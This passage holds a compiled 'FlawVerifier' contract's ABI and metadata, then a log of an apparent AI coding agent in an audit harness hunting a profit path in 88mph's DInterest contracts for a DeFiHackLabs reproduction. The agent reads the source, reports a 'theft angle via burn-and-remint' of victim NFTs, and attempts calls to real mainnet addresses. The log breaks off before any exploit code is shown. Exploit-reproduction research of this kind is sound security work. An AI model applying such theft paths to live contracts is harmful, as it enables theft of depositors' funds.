;12753:60;12809:3;12800:6;12789:9;12785:22;12753:60;:::i;:::-;12746:4;12739:5;12735:16;12728:86;12648:177;12892:2;12933:60;12989:3;12980:6;12969:9;12965:22;12933:60;:::i;:::-;12926:4;12919:5;12915:16;12908:86;12835:170;13089:2;13130:60;13186:3;13177:6;13166:9;13162:22;13130:60;:::i;:::-;13123:4;13116:5;13112:16;13105:86;13015:187;13263:3;13305:57;13358:3;13349:6;13338:9;13334:22;13305:57;:::i;:::-;13298:4;13291:5;13287:16;13280:83;13212:162;13451:3;13493:57;13546:3;13537:6;13526:9;13522:22;13493:57;:::i;:::-;13486:4;13479:5;13475:16;13468:83;13384:178;13635:3;13677:60;13733:3;13724:6;13713:9;13709:22;13677:60;:::i;:::-;13670:4;13663:5;13659:16;13652:86;13572:177;13817:3;13859:60;13915:3;13906:6;13895:9;13891:22;13859:60;:::i;:::-;13852:4;13845:5;13841:16;13834:86;13759:172;14002:3;14046:60;14102:3;14093:6;14082:9;14078:22;14046:60;:::i;:::-;14037:6;14030:5;14026:18;14019:88;13941:177;12206:1919;;;;:::o;14131:398::-;14224:6;14273:3;14261:9;14252:7;14248:23;14244:33;14241:120;;;14280:79;;:::i;:::-;14241:120;14400:1;14425:87;14504:7;14495:6;14484:9;14480:22;14425:87;:::i;:::-;14415:97;;14371:151;14131:398;;;;:::o;14535:345::-;14602:6;14651:2;14639:9;14630:7;14626:23;14622:32;14619:119;;;14657:79;;:::i;:::-;14619:119;14777:1;14802:61;14855:7;14846:6;14835:9;14831:22;14802:61;:::i;:::-;14792:71;;14748:125;14535:345;;;;:::o;14886:180::-;14934:77;14931:1;14924:88;15031:4;15028:1;15021:15;15055:4;15052:1;15045:15;15072:233;15111:3;15134:24;15152:5;15134:24;:::i;:::-;15125:33;;15180:66;15173:5;15170:77;15167:103;;15250:18;;:::i;:::-;15167:103;15297:1;15290:5;15286:13;15279:20;;15072:233;;;:::o;15311:332::-;15432:4;15470:2;15459:9;15455:18;15447:26;;15483:71;15551:1;15540:9;15536:17;15527:6;15483:71;:::i;:::-;15564:72;15632:2;15621:9;15617:18;15608:6;15564:72;:::i;:::-;15311:332;;;;;:::o;15649:98::-;15700:6;15734:5;15728:12;15718:22;;15649:98;;;:::o;15753:147::-;15854:11;15891:3;15876:18;;15753:147;;;;:::o;15906:386::-;16010:3;16038:38;16070:5;16038:38;:::i;:::-;16092:88;16173:6;16168:3;16092:88;:::i;:::-;16085:95;;16189:65;16247:6;16242:3;16235:4;16228:5;16224:16;16189:65;:::i;:::-;16279:6;16274:3;16270:16;16263:23;;16014:278;15906:386;;;;:::o;16298:271::-;16428:3;16450:93;16539:3;16530:6;16450:93;:::i;:::-;16443:100;;16560:3;16553:10;;16298:271;;;;:::o;16612:1200::-;16695:5;16739:4;16727:9;16722:3;16718:19;16714:30;16711:117;;;16747:79;;:::i;:::-;16711:117;16846:21;16862:4;16846:21;:::i;:::-;16837:30;;16935:1;16975:60;17031:3;17022:6;17011:9;17007:22;16975:60;:::i;:::-;16968:4;16961:5;16957:16;16950:86;16877:170;17113:2;17154:60;17210:3;17201:6;17190:9;17186:22;17154:60;:::i;:::-;17147:4;17140:5;17136:16;17129:86;17057:169;17308:2;17349:60;17405:3;17396:6;17385:9;17381:22;17349:60;:::i;:::-;17342:4;17335:5;17331:16;17324:86;17236:185;17506:2;17547:60;17603:3;17594:6;17583:9;17579:22;17547:60;:::i;:::-;17540:4;17533:5;17529:16;17522:86;17431:188;17691:3;17733:60;17789:3;17780:6;17769:9;17765:22;17733:60;:::i;:::-;17726:4;17719:5;17715:16;17708:86;17629:176;16612:1200;;;;:::o;17818:398::-;17911:6;17960:3;17948:9;17939:7;17935:23;17931:33;17928:120;;;17967:79;;:::i;:::-;17928:120;18087:1;18112:87;18191:7;18182:6;18171:9;18167:22;18112:87;:::i;:::-;18102:97;;18058:151;17818:398;;;;:::o","linkReferences":{}},"methodIdentifiers":{"TARGET()":"cc1f2afa","burnedVictimToken()":"317c6dee","demonstratedPathRevert()":"127b0383","executeOnOpportunity()":"3c2448ed","exploitPath()":"cb707c62","failureReason()":"4f9522a4","hijackedTokenId()":"00901f40","hypothesisValidated()":"463defd1","linkedFundingId()":"6f354bc7","ownerQueryRevertedAfterBurn()":"ff5b43de","pool()":"16f0115b","profitAmount()":"5ff972cc","profitToken()":"49343624","targetIsDepositNFT()":"880d83a5","targetIsFundingNFT()":"7e21d819","usedEarlyWithdraw()":"56380369","victimOwnerBeforeBurn()":"e5d3e494"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.30+commit.73712a01\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"TARGET\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"burnedVictimToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"demonstratedPathRevert\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"executeOnOpportunity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exploitPath\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"failureReason\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"hijackedTokenId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"hypothesisValidated\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"linkedFundingId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ownerQueryRevertedAfterBurn\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pool\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"profitAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"profitToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"targetIsDepositNFT\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"targetIsFundingNFT\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"usedEarlyWithdraw\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"victimOwnerBeforeBurn\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/FlawVerifier.sol\":\"FlawVerifier\"},\"evmVersion\":\"prague\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/FlawVerifier.sol\":{\"keccak256\":\"0x7eaf18d4c6ec98a11f705c18cef7c043112107726204e71b42f6c3bbca49de77\",\"urls\":[\"bzz-raw://ae30024342fc6e4c70509a9e578ea1c58b1e59dfe799022314a1badc1768bc51\",\"dweb:/ipfs/QmeUVxeg9rw6wypcVdTrwPZzsLYFsSfc6zAfaj1JzUUjh1\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.30+commit.73712a01"},"language":"Solidity","output":{"abi":[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"stateMutability":"view","type":"function","name":"TARGET","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"burnedVictimToken","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"demonstratedPathRevert","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"executeOnOpportunity"},{"inputs":[],"stateMutability":"view","type":"function","name":"exploitPath","outputs":[{"internalType":"string","name":"","type":"string"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"failureReason","outputs":[{"internalType":"string","name":"","type":"string"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"hijackedTokenId","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"hypothesisValidated","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"linkedFundingId","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"ownerQueryRevertedAfterBurn","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"pool","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"profitAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"profitToken","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"targetIsDepositNFT","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"targetIsFundingNFT","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"usedEarlyWithdraw","outputs":[{"internalType":"bool","name":"","type":"bool"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"victimOwnerBeforeBurn","outputs":[{"internalType":"address","name":"","type":"address"}]}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":[],"optimizer":{"enabled":false,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/FlawVerifier.sol":"FlawVerifier"},"evmVersion":"prague","libraries":{}},"sources":{"src/FlawVerifier.sol":{"keccak256":"0x7eaf18d4c6ec98a11f705c18cef7c043112107726204e71b42f6c3bbca49de77","urls":["bzz-raw://ae30024342fc6e4c70509a9e578ea1c58b1e59dfe799022314a1badc1768bc51","dweb:/ipfs/QmeUVxeg9rw6wypcVdTrwPZzsLYFsSfc6zAfaj1JzUUjh1"],"license":null}},"version":1},"id":0}
+codex
+I found the current PoC only; now locating the test harness.
+exec
+/bin/bash -lc "pwd && rg --files .. | sed 's#"'^../##'"' | rg '("'^|/)(test|src|script|foundry.toml|README|AGENTS'"\\.md)'" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 50ms:
+/Users/zhanglongqin/AuditHoundV2/cases/88mph/src
+src/src/FlawVerifier.sol
+src/onchain_auto/_index.json
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/_etherscan_meta.json
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin/contracts/ownership/Ownable.sol
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin/contracts/math/Math.sol
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin/contracts/math/SafeMath.sol
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin/contracts/introspection/IERC165.sol
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin/contracts/introspection/ERC165.sol
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin/contracts/utils/Address.sol
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin/contracts/utils/ReentrancyGuard.sol
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin/contracts/drafts/Counters.sol
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin/contracts/GSN/Context.sol
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin/contracts/access/roles/SignerRole.sol
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin/contracts/access/Roles.sol
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin/contracts/token/ERC721/IERC721.sol
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin/contracts/token/ERC721/ERC721.sol
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin/contracts/token/ERC721/ERC721Metadata.sol
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/@openzeppelin/contracts/token/ERC721/IERC721Metadata.sol
+codex
+Next I’m reading the local 88mph contracts to find a valid profit path.
+exec
+/bin/bash -lc "cd .. && sed -n '1,260p' src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol && printf '\\n--- NFT ---\\n' && sed -n '1,220p' src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/NFT.sol && printf '\\n--- MPHMinter ---\\n' && sed -n '1,260p' src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/rewards/MPHMinter.sol" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 52ms:
+pragma solidity 0.5.17;
+pragma experimental ABIEncoderV2;
+
+import "@openzeppelin/contracts/math/SafeMath.sol";
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/SafeERC20.sol";
+import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+import "@openzeppelin/contracts/ownership/Ownable.sol";
+import "./libs/DecMath.sol";
+import "./moneymarkets/IMoneyMarket.sol";
+import "./models/fee/IFeeModel.sol";
+import "./models/interest/IInterestModel.sol";
+import "./NFT.sol";
+import "./rewards/MPHMinter.sol";
+import "./models/interest-oracle/IInterestOracle.sol";
+
+// DeLorean Interest -- It's coming back from the future!
+// EL PSY CONGROO
+// Author: Zefram Lou
+exec
+/bin/bash -lc "cd .. && rg -n \"function (deposit|fund|withdraw|earlyWithdraw|payInterestToFunder|topupDeposit|rolloverDeposit|payInterestToFunders)|depositNFT\\.|fundingNFT\\.|ownerOf\\(|mintFunderReward|mintDepositorReward|stablecoin\\.safeTransfer|stablecoin\\.transfer|safeTransfer\\(\" src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/rewards/MPHMinter.sol" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 51ms:
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/rewards/MPHMinter.sol:78:    function mintDepositorReward(
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/rewards/MPHMinter.sol:175:    function mintFunderReward(
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:142:                _depositNFT.isContract() &&
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:143:                _fundingNFT.isContract() &&
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:195:    function deposit(uint256 amount, uint256 maturationTimestamp)
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:202:    function withdraw(uint256 depositID, uint256 fundingID)
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:209:    function earlyWithdraw(uint256 depositID, uint256 fundingID)
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:259:    function fundAll() external nonReentrant {
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:292:    function fundMultiple(uint256 toDepositID) external nonReentrant {
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:374:    function payInterestToFunder(uint256 fundingID)
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:378:        address funder = fundingNFT.ownerOf(fundingID);
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:407:                stablecoin.safeTransfer(funder, interestAmount);
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:500:    function depositIsFunded(uint256 id) public view returns (bool) {
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:504:    function depositsLength() external view returns (uint256) {
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:508:    function fundingListLength() external view returns (uint256) {
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:606:        depositNFT.setTokenURI(tokenId, newURI);
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:610:        depositNFT.setBaseURI(newURI);
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:617:        depositNFT.setContractURI(newURI);
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:624:        fundingNFT.setTokenURI(tokenId, newURI);
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol:628:        fundingNFT.setBaseURI(newURI);
+codex
+I’ve got the hotspots; now I’m reading the withdrawal internals.
+exec
+/bin/bash -lc "cd .. && sed -n '190,450p' src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol && printf '\\n---\\n' && sed -n '680,950p' src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 52ms:
+
+    /**
+        Public actions
+     */
+
+    function deposit(uint256 amount, uint256 maturationTimestamp)
+        external
+        nonReentrant
+    {
+        _deposit(amount, maturationTimestamp);
+    }
+
+    function withdraw(uint256 depositID, uint256 fundingID)
+        external
+        nonReentrant
+    {
+        _withdraw(depositID, fundingID, false);
+    }
+
+    function earlyWithdraw(uint256 depositID, uint256 fundingID)
+exec
+/bin/bash -lc "cd .. && sed -n '740,845p' src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/DInterest.sol" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 67ms:
+        uint256 fundingID,
+        bool early
+    ) internal {
+        Deposit storage depositEntry = _getDeposit(depositID);
+
+        // Verify deposit is active and set to inactive
+        require(depositEntry.active, "DInterest: Deposit not active");
+        depositEntry.active = false;
+
+        if (early) {
+            // Verify `now < depositEntry.maturationTimestamp`
+            require(
+                now < depositEntry.maturationTimestamp,
+                "DInterest: Deposit mature, use withdraw() instead"
+            );
+            // Verify `now > depositEntry.depositTimestamp`
+            require(
+                now > depositEntry.depositTimestamp,
+                "DInterest: Deposited in same block"
+            );
+exec
+/bin/bash -lc "cd .. && sed -n '1,220p' src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/NFT.sol" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 59ms:
+pragma solidity 0.5.17;
+
+import "@openzeppelin/contracts/token/ERC721/ERC721Metadata.sol";
+import "@openzeppelin/contracts/ownership/Ownable.sol";
+
+contract NFT is ERC721Metadata("", ""), Ownable {
+    /*
+     * bytes4(keccak256('supportsInterface(bytes4)')) == 0x01ffc9a7
+     */
+    bytes4 private constant _INTERFACE_ID_ERC165 = 0x01ffc9a7;
+    /*
+     *     bytes4(keccak256('name()')) == 0x06fdde03
+     *     bytes4(keccak256('symbol()')) == 0x95d89b41
+     *     bytes4(keccak256('tokenURI(uint256)')) == 0xc87b56dd
+     *
+     *     => 0x06fdde03 ^ 0x95d89b41 ^ 0xc87b56dd == 0x5b5e139f
+     */
+    bytes4 private constant _INTERFACE_ID_ERC721_METADATA = 0x5b5e139f;
+    /*
+     *     bytes4(keccak256('balanceOf(address)')) == 0x70a08231
+codex
+I see a theft angle via burn-and-remint; confirming token addresses next.
+exec
+/bin/bash -lc 'cd .. && rg -n "A64BD6C70Cb9051F6A9ba1F163Fdc07E0DfB5F84|904F81EFF3c35877865810CCA9a63f2D9cB7D4DD|F0b7DE03134857391d8D43Ed48e20EDF21461097|MPH|stablecoin|moneyMarket|mphMinter" src/onchain_auto -S' in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 52ms:
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/interest-oracle/IInterestOracle.sol:8:    function moneyMarket() external view returns (address);
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/interest-oracle/EMAOracle.sol:31:    IMoneyMarket public moneyMarket;
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/interest-oracle/EMAOracle.sol:38:        address _moneyMarket
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/interest-oracle/EMAOracle.sol:48:        moneyMarket = IMoneyMarket(_moneyMarket);
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/interest-oracle/EMAOracle.sol:49:        lastIncomeIndex = moneyMarket.incomeIndex();
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/interest-oracle/EMAOracle.sol:62:        uint256 newIncomeIndex = moneyMarket.incomeIndex();
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/issuance/MPHIssuanceModel01.sol:7:import "./IMPHIssuanceModel.sol";
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/issuance/MPHIssuanceModel01.sol:9:contract MPHIssuanceModel01 is Ownable, IMPHIssuanceModel {
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/issuance/MPHIssuanceModel01.sol:17:        @notice The multiplier applied when minting MPH for a pool's depositor reward.
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/issuance/MPHIssuanceModel01.sol:18:                Unit is MPH-wei per depositToken-wei per second. (wei here is the smallest decimal place)
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/issuance/MPHIssuanceModel01.sol:24:        @notice The multiplier applied when taking back MPH from depositors upon withdrawal.
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/issuance/MPHIssuanceModel01.sol:30:        @notice The multiplier applied when minting MPH for a pool's funder reward.
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/issuance/MPHIssuanceModel01.sol:31:                Unit is MPH-wei per depositToken-wei per second. (wei here is the smallest decimal place)
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/issuance/MPHIssuanceModel01.sol:67:        @notice Computes the MPH amount to reward to a depositor upon deposit.
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/issuance/MPHIssuanceModel01.sol:69:        @param  depositAmount The deposit amount in the pool's stablecoins
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/issuance/MPHIssuanceModel01.sol:71:        @param  interestAmount The deposit's fixed-rate interest amount in the pool's stablecoins
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/issuance/MPHIssuanceModel01.sol:72:        @return depositorReward The MPH amount to mint to the depositor
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/issuance/MPHIssuanceModel01.sol:73:                devReward The MPH amount to mint to the dev wallet
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/issuance/MPHIssuanceModel01.sol:74:                govReward The MPH amount to mint to the gov treasury
+src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/contracts/models/issuance/MPHIssuanceModel01.sol:99:        @notice Computes the MPH amount to take back from a depositor upon withdrawal.
+exec
+/bin/bash -lc "cd .. && ls -la && printf '\\n--- foundry ---\\n' && sed -n '1,220p' foundry.toml 2>/dev/null || true && printf '\\n--- tests ---\\n' && rg --files . | rg 'test/.+\\.sol"'$'"' && printf '\\n--- exploit test ---\\n' && sed -n '1,260p' test/ExploitPOC.t.sol" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src exited 1 in 51ms:
+total 24
+drwxr-xr-x    5 zhanglongqin  staff   160 May 13 17:26 .
+drwxr-xr-x  206 zhanglongqin  staff  6592 May 16 12:15 ..
+-rw-r--r--@   1 zhanglongqin  staff  6148 May 13 17:27 .DS_Store
+-rw-r--r--    1 zhanglongqin  staff   287 May 12 14:23 manifest.json
+drwxr-xr-x    6 zhanglongqin  staff   192 May 16 16:46 src
+
+--- foundry ---
+
+--- tests ---
+exec
+/bin/bash -lc "cd /Users/zhanglongqin/AuditHoundV2/cases/88mph && ls -la && printf '\\n--- foundry ---\\n' && sed -n '1,220p' foundry.toml && printf '\\n--- test files ---\\n' && rg --files . | rg 'test/.+\\.sol"'$'"' && printf '\\n--- exploit test ---\\n' && sed -n '1,260p' test/ExploitPOC.t.sol" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src exited 1 in 77ms:
+total 24
+drwxr-xr-x    5 zhanglongqin  staff   160 May 13 17:26 .
+drwxr-xr-x  206 zhanglongqin  staff  6592 May 16 12:15 ..
+-rw-r--r--@   1 zhanglongqin  staff  6148 May 13 17:27 .DS_Store
+-rw-r--r--    1 zhanglongqin  staff   287 May 12 14:23 manifest.json
+drwxr-xr-x    6 zhanglongqin  staff   192 May 16 16:46 src
+
+--- foundry ---
+sed: foundry.toml: No such file or directory
+exec
+/bin/bash -lc "cat /Users/zhanglongqin/AuditHoundV2/cases/88mph/manifest.json && printf '\\n---\\n' && find /Users/zhanglongqin/AuditHoundV2 -maxdepth 3 -name 'ExploitPOC.t.sol' -o -name 'foundry.toml' | sed -n '1,120p'" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 259ms:
+{
+  "audit_id": "88mph",
+  "task_source": "defihacklabs",
+  "chain": "mainnet",
+  "fork_block_number": 12516705,
+  "target_contract_address": "0xF0b7DE03134857391d8D43Ed48e20EDF21461097",
+  "evm_version": "shanghai",
+  "target_root": "/Users/zhanglongqin/AuditHoundV2/cases/88mph/src"
+}
+
+---
+codex
+I’ve got enough code context; now querying the forked contracts directly.
+exec
+/bin/bash -lc 'RPC=$(printenv AUDITHOUND_RPC_URL); '"\\
+cast call --rpc-url \""'$RPC" 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD "depositNFT()(address)" && '"\\
+cast call --rpc-url \""'$RPC" 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD "fundingNFT()(address)" && '"\\
+cast call --rpc-url \""'$RPC" 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD "stablecoin()(address)" && '"\\
+cast call --rpc-url \""'$RPC" 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD "moneyMarket()(address)" && '"\\
+cast call --rpc-url \""'$RPC" 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD "mphMinter()(address)"' in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src exited 1 in 235ms:
+Error: Internal transport error: Socket operation on non-socket (os error 38) with /Users/zhanglongqin/AuditHoundV2/cases/88mph/src/
+exec
+/bin/bash -lc 'echo "RPC=$AUDITHOUND_RPC_URL" | sed '"'s#://.*@#://***@#'" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 60ms:
+RPC=
+exec
+/bin/bash -lc "sed -n '1,260p' src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/_etherscan_meta.json" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src exited 1 in 62ms:
+sed: src/onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/_etherscan_meta.json: No such file or directory
+exec
+/bin/bash -lc "sed -n '1,260p' onchain_auto/0xf0b7de03134857391d8d43ed48e20edf21461097/_etherscan_meta.json" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 51ms:
+{
+  "contract_name": "NFT",
